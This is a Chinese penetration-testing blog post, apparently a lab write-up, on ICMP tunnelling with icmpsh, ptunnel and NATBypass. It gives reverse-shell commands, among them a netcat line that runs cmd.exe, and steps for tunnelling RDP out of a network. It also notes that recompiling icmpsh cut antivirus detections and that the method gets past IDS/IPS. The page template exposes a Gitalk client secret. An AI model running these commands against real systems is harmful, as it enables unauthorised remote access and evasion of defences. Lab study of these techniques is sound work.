@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>ICMP隧道学习笔记 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ICMP隧道学习笔记 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2020/06/25/icmp_tunnel_learning_note//images/icmp2.png">
+<meta property="twitter:image" content="https://blog.play2win.top/2020/06/25/icmp_tunnel_learning_note//images/icmp2.png">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="ICMP隧道学习笔记" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="ICMP隧道学习笔记" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-image">
+        <span  class="image is-7by1">
+            <img class="thumbnail" src="/images/icmp2.png" alt="ICMP隧道学习笔记">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-06-25T03:02:27.000Z">2020-06-25</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/渗透测试/">渗透测试</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    10 分钟 读完 (大约 1528 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                ICMP隧道学习笔记
+            
+        </h1>
+        <div class="content">
+            <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ICMP协议通常用于返回的错误信息或是分析路由，ping和traceroute使用的就是这个协议。通常两台设备通信需要通过端口，但在ICMP协议下就不需要，依据这个特点可绕过IDS、IPS等设备。</p>
+<a id="more"></a>
+<h2 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h2><p>icmpsh是基于ICMP协议，可在攻击者服务器跨平台运行的Windows反弹shell工具。下面其是github上的项目地址。</p>
+<blockquote>
+<p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">https://github.com/inquisb/icmpsh</a></p>
+</blockquote>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>把icmpsh项目从github上下载下来，把其中的icmpsh.exe上传到目标主机。</p>
+<p>Linux作为攻击者服务器则需要安装python的impacket库，我的Parrot系统上已将安装好了。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo apt install python-impacket</span><br></pre></td></tr></table></figure>
+<p>run.sh脚本里获取网卡和ip地址的方法在我的系统里无效，于把获取命令稍微改了一下，我的网卡名是eth0。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IP=$(ifconfig <span class="hljs-string">"eth0"</span> |grep <span class="hljs-string">"inet "</span>| awk <span class="hljs-string">'&#123; print $2 &#125;'</span>)</span><br></pre></td></tr></table></figure>
+<p>接着以管理员权限运行run.sh脚本，输入目标主机的ip地址，复制给出的命令到目标主机运行。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 110744.png" alt></p>
+<p>目标主机执行命令后成功反弹shell。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 111012.png" alt></p>
+<p>其实直接运行项目下的icmpsh_m.py效果也是一样的，不过要先手动关闭ping命令的ICMP应答。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1</span><br><span class="line"></span><br><span class="line">sudo python icmpsh_m.py ATTACKER_IP VICTIM_IP</span><br></pre></td></tr></table></figure>
+<h3 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h3><p>使用tcpdump抓下192.168.189.129和192.168.189.135之间的所有数据包。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo tcpdump ip host 192.168.189.129 and 192.168.189.135 -w /tmp/icmp.cap</span><br></pre></td></tr></table></figure>
+<p>用wireshark打开再去到的数据，可以看到两台主机之间的数据包的协议都是ICMP。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114239.png" alt></p>
+<p>找到了对输入命令请求和响应的两个包，发现他们的内容都明文存储在ICMP报文的Data结构处。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 114448.png" alt></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115130.png" alt></p>
+<h3 id="杀软查杀情况"><a href="#杀软查杀情况" class="headerlink" title="杀软查杀情况"></a>杀软查杀情况</h3><p>由于能够直接反弹shell，在virustotal几乎一半的厂商都报毒了。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 115457.png" alt></p>
+<p>使用源码从新编译的上传上去试试，只有一个厂商报毒。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-23 120042.png" alt></p>
+<h2 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h2><p>与icmpsh一样，ptunnel也是基于ICMP协议的工具，但ptunnel是一个纯粹的ICMP隧道，能实现正向隧道的功能。经我测试icmpsh需要两台机器都是公网的才能反弹shell，ptunnel就没这个问题，但使用这个需要管理员权限。Kali和Parrot已有这个工具，也有Windows版，需要自己编译，但无论是我自己编译的，还是GitHub上编译好的都没法在Windows2012上运行，倒是能在Windows10上运行，不知道是不是编译环境的问题，还是他WinPcap库的问题。</p>
+<blockquote>
+<p><a href="https://github.com/ptunnel-win/ptunnel（非官方，貌似官方没发在GitHub上）" target="_blank" rel="noopener">https://github.com/ptunnel-win/ptunnel（非官方，貌似官方没发在GitHub上）</a></p>
+</blockquote>
+<p>自己编译要装好MinGW。</p>
+<p>编译方法：把项目clone下来，再把<strong><a href="http://www.winpcap.org/install/bin/WpdPack_4_0_2.zip" target="_blank" rel="noopener">WinPcap</a></strong>库下载下来，放到同一个项目文件夹里，在使用如下命令编译。</p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gcc ptunnel.c md5.c -L".\WpdPack\Lib" -I".\WpdPack\Include" -lwpcap -lwsock32 -g -Wall -DWIN32 -o ptunnel.exe</span><br></pre></td></tr></table></figure>
+<h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>服务端：</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
+<p>客户端：</p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ptunnel.exe -p SERVER_IP -lp <span class="hljs-number">8888</span> -da SERVER_IP -dp <span class="hljs-number">8888</span></span><br></pre></td></tr></table></figure>
+<p>服务的出现建立Session的字样既成功建立ICMP隧道。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 224651.png" alt></p>
+<p>现在测试下再目标主机反弹个shell，先在攻击者主机监听指定端口，然后再在目标主机用nc反弹个shell到本地监听的端口。<strong>注意顺序不对可能连接不上</strong>，玄学问题。</p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-function">server:</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc</span> -<span class="hljs-title">lvp</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">client</span>:</span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-title">nc.exe</span> 127.0.0.1 3399 -<span class="hljs-title">e</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Windows</span>\<span class="hljs-title">System32</span>\<span class="hljs-title">cmd.exe</span></span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-24 225757.png" alt></p>
+<h4 id="映射3389"><a href="#映射3389" class="headerlink" title="映射3389"></a>映射3389</h4><p>既然都建立了ICMP隧道了，仅仅反弹个shell肯定是不够的，下面就试试内网3389通过ICMP隧道映射到外网。以下是拓扑图：</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/icmp拓扑图.jpg" alt></p>
+<p>先在Attacker主机开启ptunnel。</p>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo ptunnel</span><br></pre></td></tr></table></figure>
+<p>再在Server主机ptunnel作为服务端开启本地监听端口。</p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ptunnel.exe -p <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -lp <span class="hljs-number">3399</span> -da <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">3</span>.<span class="hljs-number">65</span> -dp <span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
+<p>接着在Attacker主机使用lcx类的工具，开启监听模式。这里的lcx类工具我使用的是NATBypass，用go编写，编译成不同可执行文件后可跨平台使用。</p>
+<blockquote>
+<p><a href="https://github.com/cw1997/NATBypass" target="_blank" rel="noopener">https://github.com/cw1997/NATBypass</a></p>
+</blockquote>
+<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">./nb -listen 3399 3389</span><br></pre></td></tr></table></figure>
+<p>最后在Server主机使用slave模式，转发3389到ptunnel本地监听的端口。</p>
+<figure class="highlight cmd hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nb.exe -slave <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3389</span> <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">3399</span></span><br></pre></td></tr></table></figure>
+<p>出现accept a new client字样，既成功建立连接。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 094141.png" alt></p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 095506.png" alt></p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>通过ICMP隧道映射3389就这简简单单几条命令，但是遇到命令执行顺序和，一开始使用的GitHub上用C写的跨平台lcx，同网段能通过隧道，不同网段不能的问题，排查起来花了一天，wtcl。</p>
+<h3 id="数据包分析-1"><a href="#数据包分析-1" class="headerlink" title="数据包分析"></a>数据包分析</h3><p>用wireshark抓下反弹shell时的数据包。没有使用密码时，数据包内容跟icmpsh一样，都是明文写在ICMP报文的Data结构里，但是Data结构里还有几十字节的其他内容，可能是记录转发ip和端口之类的内容。</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 103441.png" alt></p>
+<p>使用密码时反弹shell的数据包是一样的，可能是在建立隧道时才进行一次密码确认。</p>
+<h3 id="杀软查杀情况-1"><a href="#杀软查杀情况-1" class="headerlink" title="杀软查杀情况"></a>杀软查杀情况</h3><p>ptunnel在virustotal上有五个厂商报毒，其中一个识别出来是ptunnel，总体问题不大。（我怎么记得昨天才有两个报毒的呢-_-!）</p>
+<p><img src="/2020/06/25/icmp_tunnel_learning_note/批注 2020-06-25 101912.png" alt></p>
+<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>其他类似工具有<strong><a href="https://github.com/esrrhs/pingtunnel" target="_blank" rel="noopener">pingtunnel</a></strong>，用go编写，支持转发tcp、udp和sock5，能够开平台使用。不过我用这个想把3389映射出来时，遇到点问题，没映射成功。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以前不知道ping和traceroute有的是什么协议，现在知道了是他们特有的ICMP协议，通过ICMP还了解到这么多妙用:D</p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2020/06/25/icmp_tunnel_learning_note/">ICMP隧道学习笔记</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2020/06/25/icmp_tunnel_learning_note/">https://blog.play2win.top/2020/06/25/icmp_tunnel_learning_note/</a></li>
+            <li><strong>发布时间：</strong>2020-06-25</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/ICMP/">ICMP</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/06/28/GlasgowSmile_walkthrough/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">GlasgowSmile walkthrought</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/06/20/Seppuku_walkthrough/">
+                <span class="level-item">Seppuku walkthrought</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: '9e8ce3e803e211cc5f7abdc382cefd41',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#原理">
+        <span class="has-mr-6">1</span>
+        <span>原理</span>
+        </a></li><li>
+        <a class="is-flex" href="#icmpsh">
+        <span class="has-mr-6">2</span>
+        <span>icmpsh</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#使用方法">
+        <span class="has-mr-6">2.1</span>
+        <span>使用方法</span>
+        </a></li><li>
+        <a class="is-flex" href="#数据包分析">
+        <span class="has-mr-6">2.2</span>
+        <span>数据包分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#杀软查杀情况">
+        <span class="has-mr-6">2.3</span>
+        <span>杀软查杀情况</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#ptunnel">
+        <span class="has-mr-6">3</span>
+        <span>ptunnel</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#使用方法-1">
+        <span class="has-mr-6">3.1</span>
+        <span>使用方法</span>
+        </a><ul class="menu-list"><li>
+        <a class="is-flex" href="#反弹shell">
+        <span class="has-mr-6">3.1.1</span>
+        <span>反弹shell</span>
+        </a></li><li>
+        <a class="is-flex" href="#映射3389">
+        <span class="has-mr-6">3.1.2</span>
+        <span>映射3389</span>
+        </a></li><li>
+        <a class="is-flex" href="#小结">
+        <span class="has-mr-6">3.1.3</span>
+        <span>小结</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#数据包分析-1">
+        <span class="has-mr-6">3.2</span>
+        <span>数据包分析</span>
+        </a></li><li>
+        <a class="is-flex" href="#杀软查杀情况-1">
+        <span class="has-mr-6">3.3</span>
+        <span>杀软查杀情况</span>
+        </a></li></ul></li><li>
+        <a class="is-flex" href="#其他工具">
+        <span class="has-mr-6">4</span>
+        <span>其他工具</span>
+        </a></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">5</span>
+        <span>后记</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
